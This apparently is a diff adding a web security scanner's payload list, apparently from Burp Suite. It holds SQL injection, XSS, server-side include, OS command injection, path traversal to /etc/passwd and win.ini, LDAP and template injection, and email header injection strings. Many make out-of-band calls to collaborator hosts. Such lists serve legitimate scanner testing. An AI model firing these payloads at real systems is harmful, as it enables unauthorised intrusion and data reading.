+    User-Agent: sbjx''dfle
+    User-Agent: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ifeht SYSTEM "http://krf7oshcxwuq8z5zewk1y2nb62cv0loocjz9ny.burpcollab'||'orator.net/">%ifeht;]>'),'/l') from dual)
+    User-Agent: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jtagz SYSTEM "http://vfekejy09fydz4oyddhngpr18sel2bqee91zpo.burpcollab'||'orator.net/">%jtagz;]>'),'/l') from dual)
+    User-Agent: (select load_file('\\\\y0zlx6qq6a34hdednatf7gwpfgl99zxqzeu1kp9.burpcollaborator.net\\hhv'))
+    User-Agent: (select load_file('\\\\yuwntmd3oidge731sgwqvs64nvtohe557t2gs4h.burpcollaborator.net\\fcd'))
+    User-Agent: "-->'-->`--><!--#set var="lin" value="khm7es7cnw"--><!--#set var="nkp" value="mjo9gu9epy"--><!--#echo var="lin"--><!--#echo var="nkp"--><!--#exec cmd="nslookup -q=cname 749u1fuzaj7dlmimrjxobp0yjppid810zoubkz9.burpcollaborator.net" -->
+    User-Agent: "-->'-->`--><!--#set var="m7g" value="l6fa59pq05"--><!--#set var="o9i" value="n8hc7brs27"--><!--#echo var="m7g"--><!--#echo var="o9i"--><!--#exec cmd="nslookup -q=cname 8t2xswcdnscqdh2brqv0u25em5sygo4g24xrnfc.burpcollaborator.net" -->
+    User-Agent: `sleep 11`
+    User-Agent: '"><svg/onload=fetch`//9nxwkhd1tlqf4o1oalgqurj02r8kwak2aq5dv1k\.burpcollaborator.net`>
+    User-Agent: '"><svg/onload=fetch`//hwh6v5fmq1fzgq5kuzy9xb8npev7jx7pxds0io7\.burpcollaborator.net`>
+    User-Agent: twtgt1ml25zzd8a8j5pa3bskbbh45utmhh47sw.burpcollaborator.net
+    User-Agent: TzozOiJQRE8iOjA6e30=
+    User-Agent: up28nf0loq
+    User-Agent: xm657${542*666}si71l
+    User-Agent: {!xmlparser v='<!DOCTYPE a SYSTEM "http://q3uiuoj8sjxff5j6bajpwgmo1f75vu.burpcollaborator.net/xxe"><a></a>'}
+    vjv: g
+    wrp: t
+    X-Host: bm10lz5ggv5t6kvekto3n5yhf8l19rxky8ovej3.burpcollaborator.net
+    X-Host: ivh5sqla1uyocx9xiuoz20r9a0gt4jsct0jn9by.burpcollaborator.net
+    Y5qG7fVc: Y5qG7fVc
+
+
+--------------------------------------------------------------------------------
+
+Payload used as a value for test parameter
+
+Payloads URL-Encoded:
+    1 query&searchFor=ddv77gn%3cscript%3ealert(1)%3c%2fscript%3ek495yar9eqv&goButton=go 
+    2 query 
+    3 '%22%3e%3csvg%2fonload%3dfetch%60%2f%2fqlffke4vfa485zutj8nimkxwenkg86wymmd93xs%5c.ABCtor.net%60%3e 
+    4 %22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%2262y%22%20value%3d%2251xu0tkavp%22--%3e%3c!--%23set%20var%3d%22840%22%20value%3d%2273zw2vmcxr%22--%3e%3c!--%23echo%20var%3d%2262y%22--%3e%3c!--%23echo%20var%3d%22840%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20sokhng7xic7a81xvmaqkpm0yhpnib8z0xoobez3.ABCtor.net%22%20--%3e 
+    5 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00query 
+    6 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd 
+    7 %2fetc%2fpasswd 
+    8 ...%2fquery 
+    9 %3cwci%20xmlns%3d%22http%3a%2f%2fa.b%2f%22%20xmlns%3axsi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a%2f%2fa.b%2f%20http%3a%2f%2fl6sa59pq05p3qufo438d7firzi5bt1h15ssig7.ABCtor.net%2fwci.xsd%22%3ewci%3c%2fwci%3e 
+    10 %3cwlg%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fdk12j13iex3v4mtgivm5l7wjdaj37tvujl6bu0.ABCtor.net%2ffoo%22%2f%3e%3c%2fwlg%3e 
+    11 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00query 
+    12 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini 
+    13 95o523c2pu)(!(objectClass%3d*) 
+    14 amwin%7b%7b109*755%7d%7dci4sd 
+    15 c%3a%5cwindows%5cwin.ini 
+    16 eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')) 
+    17 fiki7xgchq)(objectClass%3d* 
+    18 http%3a%2f%2fjd08c7wo73w1xsmmb1fbedpp6gc90zopcgz6nv.ABCtor.net%2f%3fquery 
+    19 javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fsmihlg5xgc5a61vvkaoknmyyfpli98x0oofb5zuX%3b.ABCtor.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e 
+    20 mrhbqaarl6a4bv0pp4tesg3skjqce22uuil5bt0 
+    21 nslookup%20-q%3dcname%20165q5pp60lpjqaf44j8t7vi7zy5rthhakybl19q.ABCtor.net.%26 
+    22 O%3a3%3a%22PDO%22%3a0%3a%7b%7d 
+    23 *)(!(objectClass%3d*) 
+    24 *)(objectClass%3d* 
+    25 query%0d%0aBCC%3awgglfkz1agze05pzeeiohqs29tfm3cr4ksbf13q@ABCtor.net%0d%0abuc%3a%20l 
+    26 query&1%0d%0aBCC%3aayczxyhfsuhsij7dws02z4agr7x0lq9i26wtnhc@ABCtor.net%0d%0amea%3a%20q=1 
+    27 query&112625817'%20or%20'7716'%3d'7716=1 
+    28 query11844225'%20or%20'2979'%3d'2984 
+    29 query&1'=1 
+    30 query&1'%20and%201866%3d1866--%20=1 
+    31 query&1%20and%201933%3d01933--%20=1 
+    32 query&1'%20and%20'2332'%3d'2335=1 
+    33 query&1'%20and%204109%3d4114--%20=1 
+    34 query&1%20and%204308%3d4310--%20=1 
+    35 query&1%20and%208157%3d8163=1 
+    36 query&1'%20and%20'8959'%3d'8959=1 
+    37 query&1%20and%208963%3d08963=1 
+    38 query&1%20and%20(select*from(select(sleep(20)))a)--%20=1 
+    39 query&1%20into%20outfile%20'%5c%5c%5c%5caaoz9ytf4utsujjd8sc2b4mg3790xqlhp5jsagz.ABCtor.net%5c%5cljz'%3b%20--%20=1 
+    40 query&1%20waitfor%20delay'0%3a0%3a20'--=1 
+    41 query&1%22=1 
+    42 query&124122181%20or%207707%3d07707--%20=1 
+    43 query&1%25%7dfrzas'%2f%22%3cabb3l=1 
+    44 query&1'%2b(function()%7bif(typeof%20tl9xe%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3btl9xe%3d1%3b%7d%7d())%2b'=1 
+    45 query&1'%2b(select%20load_file('%5c%5c%5c%5cmj9bia2rd6243vsph4lekgvscjic62utxhr4is7.ABCtor.net%5c%5cqtg'))%2b'=1 
+    46 query&1%2b(select*from(select(sleep(20)))a)%2b=1 
+    47 query&1%2c0)waitfor%20delay'0%3a0%3a20'--=1 
+    48 query&132104428'%20or%20'3274'%3d'3280=1 
+    49 query&1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c8t2xswcdnscqdh2brqv0u25em5sygo4fx3rqie7.ABC'%2b'tor.net%5cyje'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 
+    50 query&1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfat493tk4ztxuoji8xc7b9ml3c95xvlmda7xyln.ABC'%2b'tor.net%5crqy'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 
+    51 query&1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cksg9r8bpm4b2ct1nq2ucte4qlhraf03rtfn2eq3.ABC'%2b'tor.net%5cgdp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 
+    52 query&1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5clmbal95qg5536uvok3odnfyrfilb91xsogi39ry.ABC'%2b'tor.net%5cbkx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 
+    53 query&1%3e%0d%0aBCC%3aeo63n27jiy7w8nxhmwq6p80khbn4buzmtanxel3@ABCtor.net%0d%0afov%3a%20c=1 
+    54 query&150513438%20or%207151%3d07151=1 
+    55 query&155318949'%20or%208031%3d8031--%20=1 
+    56 query&156020476%20or%206053%3d6054--%20=1 
+    57 query&1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20nfyws%20SYSTEM%20%22http%3a%2f%2f3ptsor88jn8l9cy6nlrvqx19i0otcj0nohb8zx.ABC'%7c%7c'tor.net%2f%22%3e%25nfyws%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 
+    58 query&1%7d%7dfyda6'%2f%22%3cbryom=1 
+    59 query&187853056%20or%205219%3d5222=1 
+    60 query&192617032'%20or%205183%3d5188--%20=1 
+    61 query&1)waitfor%20delay'0%3a0%3a20'--=1 
+    62 query&1xyrh0%25%3ebsrx9'%2f%22%3cmtf66=1 
+    63 query'%20and%20'1665'%3d'1669 
+    64 query'%20and%204598%3d4598--%20 
+    65 query'%20and%208911%3d8919--%20 
+    66 query'%20and%20'9526'%3d'9526 
+    67 query&'%22%3e%3csvg%2fonload%3dfetch%60%2f%2ft82i7hry2drbs2hw6bal9nkz1q7jv9j19p3cu0j%5c.ABCtor.net%60%3e=1 
+    68 query&%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22a11%22%20value%3d%22900yzxjeut%22--%3e%3c!--%23set%20var%3d%22c33%22%20value%3d%22b2201zlgwv%22--%3e%3c!--%23echo%20var%3d%22a11%22--%3e%3c!--%23echo%20var%3d%22c33%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20wnnlmk61hg6e75wzlepooqz2gtmmacy4wsqfh36.ABCtor.net%22%20--%3e=1 
+    69 query'%22%600%26nslookup%20-q%3dcname%20gi25h41lc01y2prjgyk8jaumbdh65wtthk4asz.ABCtor.net.%26%60' 
+    70 query%22%7cecho%20g2kdw3r7vb%2031er4p1uxj%20%7c%7c 
+    71 query%22%7cping%20-n%2021%20127.0.0.1%20%7c%7c 
+    72 query%22 
+    73 query%25%7dcxvdq'%2f%22%3crkypg 
+    74 query%26echo%201pgr3e47ub%20ig1f4q7861%26 
+    75 query%26nslookup%20-q%3dcname%20p4ue3dnuy9n7oyds276h5jgvxm3fr5f03rqhe6.ABCtor.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20p4ue3dnuy9n7oyds276h5jgvxm3fr5f03rqhe6.ABCtor.net.%26%60' 
+    76 query%26ping%20-n%2021%20127.0.0.1%26 
+    77 query28498218'%20or%204967%3d4968--%20 
+    78 query&2AKu=78016875 
+    79 query'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b' 
+    80 query'%2b(function()%7bif(typeof%20mrw0x%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bmrw0x%3d1%3b%7d%7d())%2b' 
+    81 query'%2b(select%20load_file('%5c%5c%5c%5cke29d8xp84x2ytnnc2gcfeqq7hda10prsfj29qy.ABCtor.net%5c%5cxkp'))%2b' 
+    82 query'%2b(select*from(select(sleep(0)))a)%2b' 
+    83 query'%2b(select*from(select(sleep(20)))a)%2b' 
+    84 query'%2bsleep(20.to_i)%2b' 
+    85 query..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd 
+    86 query35412491'%20or%20'7329'%3d'7329 
+    87 query')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c334s2rm8xnmlncc61l5v4xf9w02tqjea7yylo9d.ABC'%2b'tor.net%5chva'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 
+    88 query'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c7iqwhv1ccr1p2gragpkzj1udb4hx5ntek2bp1dq.ABC'%2b'tor.net%5crbf'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 
+    89 query)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5chqb6p59mk19zaqzkozs9rb2njep7dx1otckzanz.ABC'%2b'tor.net%5ckuw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 
+    90 query%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cz88o7nr42jrhs8h26har9tk51w7pvfj69u0hq5f.ABC'%2b'tor.net%5cxum'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 
+    91 query%3e%0d%0aBCC%3arkfgjf3web3940tui9mjllwxdojh77vzpnga6yv@ABCtor.net%0d%0awdg%3a%20j 
+    92 query]]%3e%3e%3c 
+    93 query45936916'%20or%207517%3d7517--%20 
+    94 query..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini 
+    95 query&5x9S=881532837 
+    96 query'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20meulx%20SYSTEM%20%22http%3a%2f%2f1ikqhp16cl1j2ar4gjktjvu7byhr5htlhc42sr.ABC'%7c%7c'tor.net%2f%22%3e%25meulx%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c' 
+    97 query%7cecho%20jkah3x6ked%20wy96oimmai%7c%7ca%20%23'%20%7cecho%20jkah3x6ked%20wy96oimmai%7c%7ca%20%23%7c%22%20%7cecho%20jkah3x6ked%20wy96oimmai%7c%7ca%20%23 
+    98 query'%7cecho%20s6mlev6kwl%20jh6fye9zkg%20%23xzwx 
+    99 query%7cnslookup%20-q%3dcname%20g1i504klv0kylpajzy382admud06owcs0jn9by.ABCtor.net.%26 
+    100 query'%7cping%20-c%2021%20127.0.0.1%20%23 
+    101 query%7cping%20-c%2021%20127.0.0.1%7c%7cx 
+    102 query%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1 
+    103 query%7d%7dk13s3'%2f%22%3ceh2ac 
+    104 query&8CF4=250609472 
+    105 query&8kL1=1486706339 
+    106 query&actvn%7b%7b433*466%7d%7dhofp5=1 
+    107 query&cuFO=345919796 
+    108 query&e53kfle3yu=1 
+    109 query&eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))=1 
+    110 query&fiksn$%7b402*498%7divg3t=1 
+    111 query&fqrO=30001292 
+    112 query&(function()%7bif(typeof%20qezwt%3d%3d%3d'undefined')%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bqezwt%3d1%3b%7d%7d())=1 
+    113 query' 
+    114 query&javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f4mrtls59go5m6dv7kmownyyaf1lu9kxco0in9byX%3b.ABCtor.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 
+    115 query&ld6znp26yj=1 
+    116 query&O%3a3%3a%22PDO%22%3a0%3a%7b%7d=1 
+    117 query&O3Rp=354489845 
+    118 query&QAAe=800176582 
+    119 query&qgcdxhu2k3=1 
+    120 query&rRaV=454492955 
+    121 query&(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20nfyws%20SYSTEM%20%22http%3a%2f%2fmrhbqaarl6a4bv0pp4tesg3skjqce225qzdq1f.ABC'%7c%7c'tor.net%2f%22%3e%25nfyws%3b]%3e')%2c'%2fl')%20from%20dual)=1 
+    122 query&(select%20load_file('%5c%5c%5c%5coxpdwcgtr8g6hx6rv6zgyi9uqlwek48vaj46vuk.ABCtor.net%5c%5cjps'))=1 
+    123 query&(select*from(select(sleep(20)))a)=1 
+    124 query'(select*from(select(sleep(20)))a)' 
+    125 query'.sleep(hexdec(dechex(20))).' 
+    126 query'.sleep(lc(20)).' 
+    127 query&TzozOiJQRE8iOjA6e30%3d=1 
+    128 query&uigjhi1zce1c23rxgckmjou0brhk5at2lqfd61v=1 
+    129 query&WVLl=675726352 
+    130 query&XwXT=801101655 
+    131 queryy2jcvfrbtr 
+    132 queryzwonv%25%3eh6ow7'%2f%22%3crk3b2 
+    133 query&ZZan=1222450985 
+    134 (select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20meulx%20SYSTEM%20%22http%3a%2f%2f2nqrmq67hm6k7bw5lkpuowz8gzmsaiylmc92xr.ABC'%7c%7c'tor.net%2f%22%3e%25meulx%3b]%3e')%2c'%2fl')%20from%20dual) 
+    135 (select%20load_file('%5c%5c%5c%5chf06e5ym91yzzqokdzh9gbrn8ee72xqoscjz9ny.ABCtor.net%5c%5cxfv')) 
+    136 syz7q1nv63 
+    137 t5zi4hoyzdobp2ew3b7l6nhzyq4js9g14srif7.ABCtor.net 
+    138 TzozOiJQRE8iOjA6e30%3d 
+    139 w3zze$%7b511*778%7dq8atk 
+
+Payloads URL-Decoded:
+    1 query&searchFor=ddv77gn<script>alert(1)</script>k495yar9eqv&goButton=go 
+    2 query 
+    3 '"><svg/onload=fetch`//qlffke4vfa485zutj8nimkxwenkg86wymmd93xs\.ABCtor.net`> 
+    4 "-->'-->`--><!--#set var="62y" value="51xu0tkavp"--><!--#set var="840" value="73zw2vmcxr"--><!--#echo var="62y"--><!--#echo var="840"--><!--#exec cmd="nslookup -q=cname sokhng7xic7a81xvmaqkpm0yhpnib8z0xoobez3.ABCtor.net" --> 
+    5 ../../../../../../../../../../../../../../../../etc/passwd.query 
+    6 ../../../../../../../../../../../../../../../../etc/passwd 
+    7 /etc/passwd 
+    8 .../query 
+    9 <wci xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://l6sa59pq05p3qufo438d7firzi5bt1h15ssig7.ABCtor.net/wci.xsd">wci</wci> 
+    10 <wlg xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://dk12j13iex3v4mtgivm5l7wjdaj37tvujl6bu0.ABCtor.net/foo"/></wlg> 
+    11 ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini.query 
+    12 ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini 
+    13 95o523c2pu)(!(objectClass=*) 
+    14 amwin{{109*755}}ci4sd 
+    15 c:\windows\win.ini 
+    16 eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')) 
+    17 fiki7xgchq)(objectClass=* 
+    18 http://jd08c7wo73w1xsmmb1fbedpp6gc90zopcgz6nv.ABCtor.net/?query 
+    19 javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/smihlg5xgc5a61vvkaoknmyyfpli98x0oofb5zuX;.ABCtor.net/).replace(/.;/g,[])]//'src=> 
+    20 mrhbqaarl6a4bv0pp4tesg3skjqce22uuil5bt0 
+    21 nslookup -q=cname 165q5pp60lpjqaf44j8t7vi7zy5rthhakybl19q.ABCtor.net.& 
+    22 O:3:"PDO":0:{} 
+    23 *)(!(objectClass=*) 
+    24 *)(objectClass=* 
+    25 query
+    BCC:wgglfkz1agze05pzeeiohqs29tfm3cr4ksbf13q@ABCtor.net
+    buc: l 
+    26 query&1
+    BCC:ayczxyhfsuhsij7dws02z4agr7x0lq9i26wtnhc@ABCtor.net
+    mea: q=1 
+    27 query&112625817' or '7716'='7716=1 
+    28 query11844225' or '2979'='2984 
+    29 query&1'=1 
+    30 query&1' and 1866=1866-- =1 
+    31 query&1 and 1933=01933-- =1 
+    32 query&1' and '2332'='2335=1 
+    33 query&1' and 4109=4114-- =1 
+    34 query&1 and 4308=4310-- =1 
+    35 query&1 and 8157=8163=1 
+    36 query&1' and '8959'='8959=1 
+    37 query&1 and 8963=08963=1 
+    38 query&1 and (select*from(select(sleep(20)))a)-- =1 
+    39 query&1 into outfile '\\\\aaoz9ytf4utsujjd8sc2b4mg3790xqlhp5jsagz.ABCtor.net\\ljz'; -- =1 
+    40 query&1 waitfor delay'0:0:20'--=1 
+    41 query&1"=1 
+    42 query&124122181 or 7707=07707-- =1 
+    43 query&1%}frzas'/"<abb3l=1 
+    44 query&1'+(function(){if(typeof tl9xe==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);tl9xe=1;}}())+'=1 
+    45 query&1'+(select load_file('\\\\mj9bia2rd6243vsph4lekgvscjic62utxhr4is7.ABCtor.net\\qtg'))+'=1 
+    46 query&1+(select*from(select(sleep(20)))a)+=1 
+    47 query&1,0)waitfor delay'0:0:20'--=1 
+    48 query&132104428' or '3274'='3280=1 
+    49 query&1');declare @q varchar(99);set @q='\\8t2xswcdnscqdh2brqv0u25em5sygo4fx3rqie7.ABC'+'tor.net\yje'; exec master.dbo.xp_dirtree @q;-- =1 
+    50 query&1);declare @q varchar(99);set @q='\\fat493tk4ztxuoji8xc7b9ml3c95xvlmda7xyln.ABC'+'tor.net\rqy'; exec master.dbo.xp_dirtree @q;-- =1 
+    51 query&1;declare @q varchar(99);set @q='\\ksg9r8bpm4b2ct1nq2ucte4qlhraf03rtfn2eq3.ABC'+'tor.net\gdp'; exec master.dbo.xp_dirtree @q;-- =1 
+    52 query&1';declare @q varchar(99);set @q='\\lmbal95qg5536uvok3odnfyrfilb91xsogi39ry.ABC'+'tor.net\bkx'; exec master.dbo.xp_dirtree @q;-- =1 
+    53 query&1>
+    BCC:eo63n27jiy7w8nxhmwq6p80khbn4buzmtanxel3@ABCtor.net
+    fov: c=1 
+    54 query&150513438 or 7151=07151=1 
+    55 query&155318949' or 8031=8031-- =1 
+    56 query&156020476 or 6053=6054-- =1 
+    57 query&1'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nfyws SYSTEM "http://3ptsor88jn8l9cy6nlrvqx19i0otcj0nohb8zx.ABC'||'tor.net/">%nfyws;]>'),'/l') from dual)||'=1 
+    58 query&1}}fyda6'/"<bryom=1 
+    59 query&187853056 or 5219=5222=1 
+    60 query&192617032' or 5183=5188-- =1 
+    61 query&1)waitfor delay'0:0:20'--=1 
+    62 query&1xyrh0%>bsrx9'/"<mtf66=1 
+    63 query' and '1665'='1669 
+    64 query' and 4598=4598--  
+    65 query' and 8911=8919--  
+    66 query' and '9526'='9526 
+    67 query&'"><svg/onload=fetch`//t82i7hry2drbs2hw6bal9nkz1q7jv9j19p3cu0j\.ABCtor.net`>=1 
+    68 query&"-->'-->`--><!--#set var="a11" value="900yzxjeut"--><!--#set var="c33" value="b2201zlgwv"--><!--#echo var="a11"--><!--#echo var="c33"--><!--#exec cmd="nslookup -q=cname wnnlmk61hg6e75wzlepooqz2gtmmacy4wsqfh36.ABCtor.net" -->=1 
+    69 query'"`0&nslookup -q=cname gi25h41lc01y2prjgyk8jaumbdh65wtthk4asz.ABCtor.net.&`' 
+    70 query"|echo g2kdw3r7vb 31er4p1uxj || 
+    71 query"|ping -n 21 127.0.0.1 || 
+    72 query" 
+    73 query%}cxvdq'/"<rkypg 
+    74 query&echo 1pgr3e47ub ig1f4q7861& 
+    75 query&nslookup -q=cname p4ue3dnuy9n7oyds276h5jgvxm3fr5f03rqhe6.ABCtor.net.&'\"`0&nslookup -q=cname p4ue3dnuy9n7oyds276h5jgvxm3fr5f03rqhe6.ABCtor.net.&`' 
+    76 query&ping -n 21 127.0.0.1& 
+    77 query28498218' or 4967=4968--  
+    78 query&2AKu=78016875 
+    79 query'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+' 
+    80 query'+(function(){if(typeof mrw0x==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);mrw0x=1;}}())+' 
+    81 query'+(select load_file('\\\\ke29d8xp84x2ytnnc2gcfeqq7hda10prsfj29qy.ABCtor.net\\xkp'))+' 
+    82 query'+(select*from(select(sleep(0)))a)+' 
+    83 query'+(select*from(select(sleep(20)))a)+' 
+    84 query'+sleep(20.to_i)+' 
+    85 query../../../../../../../../../../../../../../../../etc/passwd 
+    86 query35412491' or '7329'='7329 
+    87 query');declare @q varchar(99);set @q='\\334s2rm8xnmlncc61l5v4xf9w02tqjea7yylo9d.ABC'+'tor.net\hva'; exec master.dbo.xp_dirtree @q;--  
+    88 query';declare @q varchar(99);set @q='\\7iqwhv1ccr1p2gragpkzj1udb4hx5ntek2bp1dq.ABC'+'tor.net\rbf'; exec master.dbo.xp_dirtree @q;--  
+    89 query);declare @q varchar(99);set @q='\\hqb6p59mk19zaqzkozs9rb2njep7dx1otckzanz.ABC'+'tor.net\kuw'; exec master.dbo.xp_dirtree @q;--  
+    90 query;declare @q varchar(99);set @q='\\z88o7nr42jrhs8h26har9tk51w7pvfj69u0hq5f.ABC'+'tor.net\xum'; exec master.dbo.xp_dirtree @q;--  
+    91 query>
+    BCC:rkfgjf3web3940tui9mjllwxdojh77vzpnga6yv@ABCtor.net
+    wdg: j 
+    92 query]]>>< 
+    93 query45936916' or 7517=7517--  
+    94 query..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini 
+    95 query&5x9S=881532837 
+    96 query'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % meulx SYSTEM "http://1ikqhp16cl1j2ar4gjktjvu7byhr5htlhc42sr.ABC'||'tor.net/">%meulx;]>'),'/l') from dual)||' 
+    97 query|echo jkah3x6ked wy96oimmai||a #' |echo jkah3x6ked wy96oimmai||a #|" |echo jkah3x6ked wy96oimmai||a # 
+    98 query'|echo s6mlev6kwl jh6fye9zkg #xzwx 
+    99 query|nslookup -q=cname g1i504klv0kylpajzy382admud06owcs0jn9by.ABCtor.net.& 
+    100 query'|ping -c 21 127.0.0.1 # 
+    101 query|ping -c 21 127.0.0.1||x 
+    102 query|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 
+    103 query}}k13s3'/"<eh2ac 
+    104 query&8CF4=250609472 
+    105 query&8kL1=1486706339 
+    106 query&actvn{{433*466}}hofp5=1 
+    107 query&cuFO=345919796 
+    108 query&e53kfle3yu=1 
+    109 query&eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))=1 
+    110 query&fiksn${402*498}ivg3t=1 
+    111 query&fqrO=30001292 
+    112 query&(function(){if(typeof qezwt==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);qezwt=1;}}())=1 
+    113 query' 
+    114 query&javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/4mrtls59go5m6dv7kmownyyaf1lu9kxco0in9byX;.ABCtor.net/).replace(/.;/g,[])]//'src=>=1 
+    115 query&ld6znp26yj=1 
+    116 query&O:3:"PDO":0:{}=1 
+    117 query&O3Rp=354489845 
+    118 query&QAAe=800176582 
+    119 query&qgcdxhu2k3=1 
+    120 query&rRaV=454492955 
+    121 query&(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nfyws SYSTEM "http://mrhbqaarl6a4bv0pp4tesg3skjqce225qzdq1f.ABC'||'tor.net/">%nfyws;]>'),'/l') from dual)=1 
+    122 query&(select load_file('\\\\oxpdwcgtr8g6hx6rv6zgyi9uqlwek48vaj46vuk.ABCtor.net\\jps'))=1 
+    123 query&(select*from(select(sleep(20)))a)=1 
+    124 query'(select*from(select(sleep(20)))a)' 
+    125 query'.sleep(hexdec(dechex(20))).' 
+    126 query'.sleep(lc(20)).' 
+    127 query&TzozOiJQRE8iOjA6e30==1 
+    128 query&uigjhi1zce1c23rxgckmjou0brhk5at2lqfd61v=1 
+    129 query&WVLl=675726352 
+    130 query&XwXT=801101655 
+    131 queryy2jcvfrbtr 
+    132 queryzwonv%>h6ow7'/"<rk3b2 
+    133 query&ZZan=1222450985 
